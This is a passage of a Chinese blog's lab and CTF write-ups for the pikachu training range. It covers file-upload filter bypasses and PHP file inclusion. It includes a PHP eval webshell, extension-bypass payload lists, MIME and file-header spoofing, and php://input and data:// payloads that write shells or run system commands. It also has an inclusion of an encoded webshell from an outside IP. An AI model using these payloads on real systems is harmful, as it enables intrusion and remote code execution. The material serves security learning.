    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<p>首先保存一个shell.php用于上传</p>
<p>当上传时，会显示文件不符合要求</p>
<p><img src="/images%5Cimage-20230110110325044.png" alt="image-20230110110325044"></p>
<p>其实弹窗已经可以初步判断是客户端校验了</p>
<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
<p><img src="/images%5Cimage-20230110110530561.png" alt="image-20230110110530561"></p>
<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
<p><img src="/images%5Cimage-20230110110937647.png" alt="image-20230110110937647"></p>
<p>直接将其删除</p>
<p>此时再上传就不会有任何问题</p>
<p><img src="/images%5Cimage-20230110110655236.png" alt="image-20230110110655236"></p>
<p>蚁剑成功连接</p>
<p><img src="/images%5Cimage-20230110110914717.png" alt="image-20230110110914717"></p>
<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
<p>但同样为保留字符的0x80不行</p>
<p>在文件后缀名后的hex添加一个81</p>
<p><img src="/images%5C1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
<p><img src="/images%5C1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>

<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>

<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>

<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>

<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>

<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>

<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
<p>从而达到绕过的目的</p>
<p><img src="/images%5C1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>

<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>

<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
<p>可以看到还校验了文件内容</p>
<p><img src="/images%5Cimage-20230110112128136.png" alt="image-20230110112128136"></p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>

<p>这是gif文件的文件头</p>
<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
<p>2.更改后缀为png</p>
<p>3.更改MIME类型为image&#x2F;png</p>
<p><img src="/images%5Cimage-20230110113115973.png" alt="image-20230110113115973"></p>
<p>成功上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>

<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>

<p>url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>成功连接webshell</p>
<p><img src="/images%5Cimage-20230110133348854.png" alt="image-20230110133348854"></p>
<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
<p>MIME是由上传文件的body的Content-Type指定的</p>
<p><img src="/images%5Cimage-20230110111354014.png" alt="image-20230110111354014"></p>
<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>

<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
<p><img src="/images%5Cimage-20230110111246587.png" alt="image-20230110111246587"></p>
<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
<p>将其改为jpg或png的MIME类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>

<p>成功上传</p>
<p><img src="/images%5Cimage-20230110111611594.png" alt="image-20230110111611594"></p>
<p>成功连接webshell</p>
<p><img src="/images%5Cimage-20230110111625267.png" alt="image-20230110111625267"></p>
<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>

<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>

<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>

<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>

<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>

<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-文件包含</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h1><p><img src="/images%5C1665555684868-38ea26c8-b175-45e4-95a3-435db5eb951b.png" alt="img"></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="涉及函数"><a href="#涉及函数" class="headerlink" title="涉及函数"></a>涉及函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br><span class="line">include_once() 与include()相同，区别在于当被包含的代码存在时，则不重复包含 </span><br><span class="line">require_once() 与require()相同，区别在于当被包含的代码存在时，则不重复包含</span><br></pre></td></tr></table></figure>

<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>1、可以包含任何文件 </p>
<p>2、被包含文件中的代码满足php代码格式就会被解析执行，与后缀无关。</p>
<p>3、如果文件中的内容不满足php代码格式，那就会直接显示在页面上。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这样是正常的，因为我们还没有对其file参数传参</p>
<p><img src="/images%5C1665548578354-65d54b73-13d4-479e-a612-8a94666a946e.png" alt="img"></p>
<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=test.txt</a></p>
<p><img src="/images%5C1665548677709-994eb1e9-8ce4-4b54-a7ce-b43ba524a81b.png" alt="img"></p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=../index.html">http://127.0.0.1:88/DX/file_include/index.php?file=../index.html</a></p>
<p><img src="/images%5C1665548837727-24f9f2b0-6db0-444a-87bf-6fd594234b14.png" alt="img"></p>
<p>只要是php代码就行，文件后缀无所谓</p>
<p><img src="/images%5C1665548957675-151147db-cf72-4912-b15b-912d05a3f5a3.png" alt="img"></p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=test.txt</a></p>
<p><img src="/images%5C1665548976257-f26bdcd3-3cd0-44d7-bf92-58b022181c82.png" alt="img"></p>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com">http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com</a></p>
<p><img src="/images%5C1665549175086-f3f7b228-8f11-403c-b1b2-d24645f4da35.png" alt="img"></p>
<p>包含一句话后连接</p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=http://101.35.17.6:6666/test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=http://101.35.17.6:6666/test.txt</a></p>
<p><img src="/images%5C1665549338675-ef15c7d1-969f-42ac-8901-ed8d07b561f7.png" alt="img"></p>
<p><img src="/images%5C1665549391173-c968d06e-653e-455f-b332-b3a2d5c929f2.png" alt="img"></p>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>访问本地系统文件</p>
<p><img src="/images%5C1665549595086-117eac0d-a45f-4cef-b0cb-7b2725264307.png" alt="img"></p>
<h5 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:off&#x2F;on</p>
<p>allow_url_fopen:off&#x2F;on</p>
<h5 id="必须使用绝对路径"><a href="#必须使用绝对路径" class="headerlink" title="必须使用绝对路径"></a>必须使用绝对路径</h5><p>file:&#x2F;&#x2F;绝对路径&#x2F;文件名</p>
<p><img src="/images%5C1665549685531-33aae4d1-c9f3-4214-ba02-e78c0ff7fa52.png" alt="img"></p>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>利用php流filter返回base64加密后的php源代码</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td>&lt;；两个链的筛选列表&gt;</td>
<td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<p>我们可以利用php的filter机制来得到我们想要的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=文件名.php</span><br></pre></td></tr></table></figure>

<h5 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h5><p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-encode/resource=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-encode/resource=test.txt</a></p>
<p><img src="/images%5C1665549879949-97e9a3df-50ba-4574-876d-7bac85d67474.png" alt="img"></p>
<h5 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-encode/resource=test.txt">http://127.0.0.1:88/DX/file_include&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;</a><a href="http://www.baidu.com/">http://www.baidu.com</a></p>
<p><img src="/images%5C1665549917113-330ca4b7-1487-44f7-8685-8b2e1d2961db.png" alt="img"></p>
<h5 id="可以利用此来包含一句话木马"><a href="#可以利用此来包含一句话木马" class="headerlink" title="可以利用此来包含一句话木马"></a>可以利用此来包含一句话木马</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=文件名.php</span><br></pre></td></tr></table></figure>

<p>将一句话木马编码后放置在远程服务器上</p>
<p><img src="/images%5C1665550009883-f247beb2-fa3c-485b-aff5-2b4d2abc0b34.png" alt="img"></p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-decode/resource=http://101.35.17.6:6666/test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-decode/resource=http://101.35.17.6:6666/test.txt</a></p>
<p><img src="/images%5C1665550111038-486f417d-e512-4b90-bb8b-3c4fd955668f.png" alt="img"></p>
<p><img src="/images%5C1665550147767-2eb9da43-df4f-403b-80ab-f6b11ffa004b.png" alt="img"></p>
<h5 id="读取payload"><a href="#读取payload" class="headerlink" title="读取payload"></a>读取payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=/resource=test.txt</span><br><span class="line"></span><br><span class="line">file=php://filter//resource=test.txt</span><br><span class="line">//注意那两斜杠不能省</span><br><span class="line"></span><br><span class="line">base64编码解码</span><br><span class="line">file=php://filter/convert.base64-encode/resource=test.txt</span><br><span class="line">file=php://filter/convert.base64-decode/resource=test.txt</span><br><span class="line"></span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=test.txt</span><br></pre></td></tr></table></figure>

<p>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</p>
<p><img src="/images%5C1667208263840-995730b8-919e-413b-8c23-20de1420ef72.png" alt="img"></p>
<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>读取压缩包内的文件(绝对路径)</p>
<h5 id="限制条件-1"><a href="#限制条件-1" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:off</p>
<p>allow_url_fopen:on</p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>使用绝对路径</p>
<p>必须是zip文件，但后缀无所谓</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://绝对路径/压缩包文件#压缩包内的文件</span><br><span class="line"></span><br><span class="line">注意，#号必须url编码</span><br><span class="line"></span><br><span class="line">?file=zip://绝对路径/文件名%23压缩包内的文件</span><br></pre></td></tr></table></figure>

<p>注意，#号必须url编码</p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=zip://D:/Desktop/test.zip%23test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=zip://D:/Desktop/test.zip%23test.txt</a></p>
<p><img src="/images%5C1665551479736-692dab58-19ba-4b50-919f-ba7a2728234f.png" alt="img"></p>
<p>.zip可以改为其他任意后缀，只要文件内容是zip的内容，就能通过zip协议正常解析</p>
<p><img src="/images%5C1665551787085-f3974026-477a-4d9f-a0e6-6d73ee681d22.png" alt="img"></p>
<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>读取压缩包内的文件(绝对路径，相对路径都可以)</p>
<h5 id="限制条件-2"><a href="#限制条件-2" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:off</p>
<p>allow_url_fopen:on</p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>使用绝对路径即可</p>
<p><img src="/images%5C1665552085670-d65faa8e-7c35-4bd4-b7c6-3ddb931d96f3.png" alt="img"></p>
<p>同样，后缀不影响</p>
<p><img src="/images%5C1665552219256-d3e33144-a285-4508-a9eb-1b3d113ec534.png" alt="img"></p>
<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>该伪协议用在远程文件包含中</p>
<p>将post请求中的数据作为php代码执行</p>
<h5 id="限制条件-3"><a href="#限制条件-3" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:on (默认off)</p>
<p>allow_url_fopen:on&#x2F;off （默认on）</p>
<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://input</span><br></pre></td></tr></table></figure>

<p>include函数会将post的body中的php代码解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27;)?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1665552740842-2fc06e76-2a33-47f5-91ad-54966d86098b.png" alt="img"></p>
<p>成功写入shell</p>
<p><img src="/images%5C1665552781766-418dfd08-3f0f-49d1-aca6-583a39cba4d9.png" alt="img"></p>
<p>成功连接</p>
<p><img src="/images%5C1665552813790-cfd814e9-89fd-451e-ae0e-62cb1174fa20.png" alt="img"></p>
<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>读取数据流，如果传入的数据是php代码，就会执行代码</p>
<h5 id="限制条件-4"><a href="#限制条件-4" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:on (默认off)</p>
<p>allow_url_fopen:on（默认on）</p>
<h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">?file=data:text/plain,base64,（php的base64编码内容）</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1665552983029-fcb88f2c-8787-4b43-adc0-f4dcf6ba34ad.png" alt="img"></p>
<h4 id="可以包含一句话木马"><a href="#可以包含一句话木马" class="headerlink" title="可以包含一句话木马"></a>可以包含一句话木马</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php eval($_POST[&quot;test&quot;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1665553091038-929159af-6752-4d6a-94a3-3aa1efbf9c89.png" alt="img"></p>
<h2 id="一道CTF题"><a href="#一道CTF题" class="headerlink" title="一道CTF题"></a>一道CTF题</h2><p>这是后面做完后读到的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">  if(strstr($_GET[&#x27;file&#x27;],&#x27;data://&#x27;) or $_GET[&#x27;file&#x27;]===&#x27;hello.txt&#x27;)</span><br><span class="line">  &#123;</span><br><span class="line">    if(preg_match(&quot;/(flag)/i&quot;,$_GET[&#x27;file&#x27;]) == 1)</span><br><span class="line">    &#123;</span><br><span class="line">      die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      include $_GET[&#x27;file&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;你以为你想包含什么就包含什么嘛？&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  header(&quot;Location:./index.php?file=hello.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="代码解读"><a href="#代码解读" class="headerlink" title="代码解读"></a>代码解读</h3><p>首先要通过get请求传递file参数</p>
<p>然后看参数中是否有data:&#x2F;&#x2F;或者file是否等于hello.txt</p>
<p>参数中不能包括flag</p>
<h3 id="ls查看文件"><a href="#ls查看文件" class="headerlink" title="ls查看文件"></a>ls查看文件</h3><p><a href="http://218.94.126.122:31003/index.php?file=data://text/plain,">http://218.94.126.122:31003/index.php?file=data://text/plain,%3C?php%20system(%22ls%22);?%3E</a></p>
<p><img src="/images%5C1665988456872-620d4754-4c28-4824-ad98-c94cc9121279.png" alt="img"></p>
<p>不能直接cat该文件，因为包含“flag”</p>
<p><a href="http://218.94.126.122:31003/index.php?file=data://text/plain,">http://218.94.126.122:31003/index.php?file=data://text/plain,%3C?php%20system(%22cat%20flag_sdhalsd.php%22);?%3E</a></p>
<p><img src="/images%5C1665988596163-a8ab4cfd-0c5f-4f47-aea6-f1020bf0d755.png" alt="img"></p>
